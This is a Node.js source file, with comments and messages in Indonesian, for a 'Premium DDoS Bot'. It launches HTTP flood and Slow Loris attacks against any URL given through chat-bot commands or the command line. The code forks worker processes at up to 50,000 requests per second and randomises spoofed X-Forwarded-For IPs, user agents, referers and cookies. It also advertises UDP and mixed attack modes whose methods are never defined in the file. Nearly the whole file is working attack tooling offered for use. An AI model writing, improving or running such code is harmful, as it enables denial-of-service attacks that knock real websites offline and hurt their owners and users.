const net = require('net');
const http2 = require('http2');
const tls = require('tls');
const cluster = require('cluster');
const url = require('url');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

// ==================== CONFIGURASI PREMIUM ====================
const PREMIUM_CONFIG = {
    MAX_ATTACK_DURATION: 3600, // 1 jam maksimal
    MAX_THREADS: 16,
    MAX_RATE: 50000,
    RESOURCE_DIR: path.join(__dirname, 'resources'),
    AUTO_UPDATE_INTERVAL: 3600000, // 1 jam
    ATTACK_TYPES: {
        HTTP_FLOOD: 'http',
        SLOW_LORIS: 'slow',
        UDP_FLOOD: 'udp',
        MIXED: 'mixed'
    }
};

// ==================== KELAS UTILITAS ====================
class PremiumUtils {
    constructor() {
        this.proxies = this.loadResource('proxy.txt');
        this.userAgents = this.loadResource('ua.txt');
        this.referers = this.loadResource('referers.txt');
        this.cookies = this.loadResource('cookies.txt');
    }

    loadResource(file) {
        try {
            const filePath = path.join(PREMIUM_CONFIG.RESOURCE_DIR, file);
            return fs.readFileSync(filePath, 'utf-8')
                .split('\n')
                .filter(line => line.trim() !== '');
        } catch (error) {
            console.error(`[ERROR] Gagal memuat resource ${file}:`, error);
            return [];
        }
    }

    getRandomIP() {
        return `${this.getRandomByte()}.${this.getRandomByte()}.${this.getRandomByte()}.${this.getRandomByte()}`;
    }

    getRandomByte() {
        return Math.floor(Math.random() * 256);
    }

    getRandomString(length) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    shuffleArray(array) {
        for (let i = array.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [array[i], array[j]] = [array[j], array[i]];
        }
        return array;
    }
}

// ==================== KELAS SERANGAN ====================
class PremiumAttack extends PremiumUtils {
    constructor() {
        super();
        this.activeAttacks = new Map();
        this.attackCounter = 0;
    }

    async launchAttack(target, duration, rate, threads, attackType = 'http') {
        return new Promise((resolve, reject) => {
            try {
                const attackId = `attack-${Date.now()}-${++this.attackCounter}`;
                const targetUrl = new URL(target);
                
                if (cluster.isMaster) {
                    console.log(`[🔥] Memulai serangan premium ke ${targetUrl.hostname}`);
                    
                    const workerPromises = [];
                    for (let i = 0; i < threads; i++) {
                        const worker = cluster.fork({
                            ATTACK_ID: attackId,
                            TARGET: targetUrl.href,
                            RATE: Math.floor(rate / threads),
                            ATTACK_TYPE: attackType
                        });
                        
                        workerPromises.push(new Promise(res => {
                            worker.on('exit', res);
                        }));
                    }

                    const timer = setTimeout(() => {
                        this.stopAttack(attackId);
                        resolve();
                    }, duration * 1000);

                    this.activeAttacks.set(attackId, {
                        workers: Array.from(cluster.workers.values()),
                        timer,
                        target: targetUrl.href
                    });

                    Promise.all(workerPromises).then(() => {
                        clearTimeout(timer);
                        this.activeAttacks.delete(attackId);
                    });
                } else {
                    this.startWorker(process.env.ATTACK_TYPE);
                }
            } catch (error) {
                reject(error);
            }
        });
    }

    startWorker(attackType) {
        const attackMethods = {
            'http': this.httpFlood,
            'slow': this.slowLoris,
            'udp': this.udpFlood,
            'mixed': this.mixedAttack
        };

        const attackFn = attackMethods[attackType] || this.httpFlood;
        const ratePerSecond = parseInt(process.env.RATE);
        
        setInterval(() => {
            for (let i = 0; i < ratePerSecond; i++) {
                attackFn.call(this, new URL(process.env.TARGET));
            }
        }, 1000);
    }

    httpFlood(target) {
        const socket = net.connect(80, target.hostname, () => {
            const payload = [
                `GET ${target.pathname || '/'} HTTP/1.1`,
                `Host: ${target.hostname}`,
                `User-Agent: ${this.randomElement(this.userAgents)}`,
                `Accept: text/html,application/xhtml+xml`,
                `Referer: ${this.randomElement(this.referers)}`,
                `Cookie: ${this.randomElement(this.cookies)}`,
                `X-Forwarded-For: ${this.getRandomIP()}`,
                `Connection: keep-alive`,
                `\r\n`
            ].join('\r\n');
            
            socket.write(payload);
        });
        
        socket.on('error', () => {});
        socket.setTimeout(5000, () => socket.destroy());
    }

    slowLoris(target) {
        // Implementasi Slow Loris premium
        const socket = net.connect(80, target.hostname, () => {
            socket.write(`GET ${target.pathname || '/'} HTTP/1.1\r\n`);
            socket.write(`Host: ${target.hostname}\r\n`);
            socket.write(`User-Agent: ${this.randomElement(this.userAgents)}\r\n`);
            socket.write(`Accept: text/html,application/xhtml+xml\r\n`);
            socket.write(`Connection: keep-alive\r\n`);
            
            // Kirim header secara perlahan
            const headers = [
                `X-a: ${this.getRandomString(10)}`,
                `X-b: ${this.getRandomString(10)}`,
                `X-c: ${this.getRandomString(10)}`
            ];
            
            let index = 0;
            const interval = setInterval(() => {
                if (index < headers.length) {
                    socket.write(`${headers[index++]}\r\n`);
                } else {
                    clearInterval(interval);
                }
            }, 10000); // 10 detik per header
        });
        
        socket.on('error', () => {});
    }

    stopAttack(attackId) {
        if (this.activeAttacks.has(attackId)) {
            const { workers, timer } = this.activeAttacks.get(attackId);
            clearTimeout(timer);
            
            if (cluster.isMaster) {
                workers.forEach(worker => {
                    try {
                        process.kill(worker.process.pid);
                    } catch (error) {
                        console.error(`[ERROR] Gagal menghentikan worker:`, error);
                    }
                });
            }
            
            this.activeAttacks.delete(attackId);
            console.log(`[🛑] Serangan ${attackId} dihentikan`);
        }
    }
}

// ==================== ANTARMUKA BOT ====================
class PremiumBotInterface {
    constructor(attackManager) {
        this.manager = attackManager;
        this.commands = {
            '/hitam': this.handleHitamCommand.bind(this),
            '/stop': this.handleStopCommand.bind(this),
            '/stats': this.handleStatsCommand.bind(this),
            '/help': this.handleHelpCommand.bind(this)
        };
    }

    async handleCommand(command, args, userId) {
        try {
            if (this.commands[command]) {
                return await this.commands[command](args, userId);
            }
            return '❌ Perintah tidak dikenali. Ketik /help untuk bantuan';
        } catch (error) {
            console.error(`[ERROR] Command error:`, error);
            return '⚠️ Terjadi kesalahan saat memproses perintah';
        }
    }

    async handleHitamCommand(args, userId) {
        if (args.length < 4) {
            return this.showUsage();
        }

        const [target, durationStr, rateStr, threadsStr, attackType] = args;
        const duration = parseInt(durationStr);
        const rate = parseInt(rateStr);
        const threads = parseInt(threadsStr);

        // Validasi parameter
        if (!target.startsWith('http')) {
            return '❌ Target harus berupa URL (contoh: https://example.com)';
        }

        if (isNaN(duration) || duration < 10 || duration > PREMIUM_CONFIG.MAX_ATTACK_DURATION) {
            return `❌ Durasi harus antara 10-${PREMIUM_CONFIG.MAX_ATTACK_DURATION} detik`;
        }

        if (isNaN(rate) || rate < 100 || rate > PREMIUM_CONFIG.MAX_RATE) {
            return `❌ Rate harus antara 100-${PREMIUM_CONFIG.MAX_RATE} req/detik`;
        }

        if (isNaN(threads) || threads < 1 || threads > PREMIUM_CONFIG.MAX_THREADS) {
            return `❌ Threads harus antara 1-${PREMIUM_CONFIG.MAX_THREADS}`;
        }

        try {
            await this.manager.launchAttack(
                target,
                duration,
                rate,
                threads,
                attackType || PREMIUM_CONFIG.ATTACK_TYPES.HTTP_FLOOD
            );
            
            return `⚡ [PREMIUM ATTACK] Berhasil diluncurkan!\n\n` +
                   `🔗 Target: ${target}\n` +
                   `⏱ Durasi: ${duration} detik\n` +
                   `📊 Rate: ${rate} req/detik\n` +
                   `🧵 Threads: ${threads}\n` +
                   `⚔️ Tipe: ${attackType || 'HTTP Flood'}\n\n` +
                   `Gunakan /stop untuk menghentikan`;
        } catch (error) {
            console.error(`[ERROR] Attack error:`, error);
            return '❌ Gagal memulai serangan: ' + error.message;
        }
    }

    showUsage() {
        return `📌 Cara Penggunaan:\n\n` +
               `/hitam <target> <durasi> <rate> <threads> [tipe]\n\n` +
               `Contoh:\n` +
               `/hitam https://example.com 60 1000 4 http\n\n` +
               `Tipe Serangan:\n` +
               `- http : HTTP Flood (default)\n` +
               `- slow : Slow Loris\n` +
               `- udp  : UDP Flood\n` +
               `- mixed: Mixed Attack\n\n` +
               `Batasan:\n` +
               `⏱ Durasi: 10-${PREMIUM_CONFIG.MAX_ATTACK_DURATION} detik\n` +
               `📊 Rate: 100-${PREMIUM_CONFIG.MAX_RATE} req/detik\n` +
               `🧵 Threads: 1-${PREMIUM_CONFIG.MAX_THREADS}`;
    }

    handleStopCommand(args, userId) {
        this.manager.stopAttack(`attack-${userId}`);
        return '🛑 Semua serangan aktif dihentikan';
    }

    handleStatsCommand() {
        return `📊 Statistik Serangan:\n\n` +
               `🔄 Aktif: ${this.manager.activeAttacks.size}\n` +
               `💾 Proxies: ${this.manager.proxies.length}\n` +
               `👤 User Agents: ${this.manager.userAgents.length}`;
    }

    handleHelpCommand() {
        return `🆘 Bantuan Premium DDoS Bot\n\n` +
               `Perintah yang tersedia:\n` +
               `/hitam - Mulai serangan DDoS\n` +
               `/stop  - Hentikan semua serangan\n` +
               `/stats - Lihat statistik\n` +
               `/help  - Tampilkan bantuan ini\n\n` +
               `⚠️ Gunakan dengan bijak dan bertanggung jawab`;
    }
}

// ==================== EKSPOR UTAMA ====================
const attackManager = new PremiumAttack();
const botInterface = new PremiumBotInterface(attackManager);

module.exports = {
    PremiumAttack: attackManager,
    handleBotCommand: botInterface.handleCommand.bind(botInterface),
    botInterface
};

// ==================== CONTOH PENGGUNAAN ====================
if (require.main === module) {
    (async () => {
        console.log('🚀 Premium DDoS Bot Initialized');
        
        // Contoh penggunaan langsung
        if (process.argv.length > 2) {
            await attackManager.launchAttack(
                process.argv[2],
                parseInt(process.argv[3] || '60'),
                parseInt(process.argv[4] || '1000'),
                parseInt(process.argv[5] || '4'),
                process.argv[6]
            );
        }
    })();
}